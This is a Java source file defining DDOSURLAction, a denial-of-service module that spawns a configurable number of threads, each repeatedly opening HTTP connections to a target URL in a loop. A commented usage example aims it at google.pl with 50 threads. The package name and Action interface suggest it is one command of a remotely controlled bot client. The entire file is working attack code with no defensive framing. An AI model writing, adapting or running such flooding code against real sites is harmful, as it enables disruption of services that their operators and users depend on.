package client;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;

public class DDOSURLAction implements Action {
	
	private URL url;
	private String info = "";
	private static UrlAttacker attackers[];
	private static boolean isRunning = false;
	private int numOfThreads;
	
	
	// 	PRZYKLAD UZYCIA:
	
	/*public static void main(String[] args) throws InterruptedException {
	  	
		DDOSURLAction start = new DDOSURLAction("https://www.google.pl", 50);
		start.executeAction();
		
		Thread.sleep(1000);
		
		DDOSURLAction stop = new DDOSURLAction();
		stop.executeAction();
		
	}*/
	
	public DDOSURLAction() {
		
	}
	
	public DDOSURLAction(String url, int numOfThreads) {
		try {
			this.url = new URL(url);
		} catch (MalformedURLException e) {
			info = e.getMessage();
		}
		this.numOfThreads = numOfThreads;
	}
	
	public void startAttack() throws InterruptedException {
		attackers = new UrlAttacker[numOfThreads];
		for(int i=0; i<numOfThreads; i++) {
			attackers[i] = new UrlAttacker(this.url);
		}
		for(UrlAttacker a: attackers) {
			a.start();
		}
	}
	
	public void stopAttack() {
		if(attackers != null) {
			for(UrlAttacker a: attackers) {
				a.stopRunning();
			}
			attackers = null;
		}
	}

	@Override
	public void executeAction() {
		
		if(!isRunning) {
			try {
				startAttack();
				isRunning = true;
				info = "Attacking URL: " + url.toString();
			} catch(InterruptedException e) {
				info = e.getMessage();
			}
		} else {
			info = "Attack stopped.";
			stopAttack();
			isRunning = false;
		}
		
	}

	@Override
	public String getInfo() {
		return info;
	}
	
	private class UrlAttacker extends Thread {
		
		private boolean isRunning = true;
		private URL url;
		
		public UrlAttacker(URL url) {
			this.url = url;
		}
		
		public void stopRunning() {
			this.isRunning = false;
			
		}

		@Override
		public void run() {
			isRunning = true;
			try {
				InputStream inpstr = url.openConnection().getInputStream();
				while(isRunning) {
					inpstr = url.openConnection().getInputStream();
				}
				
				inpstr.close();
				
			} catch (IOException e) {
				isRunning = false;
			}
		}
	}

}
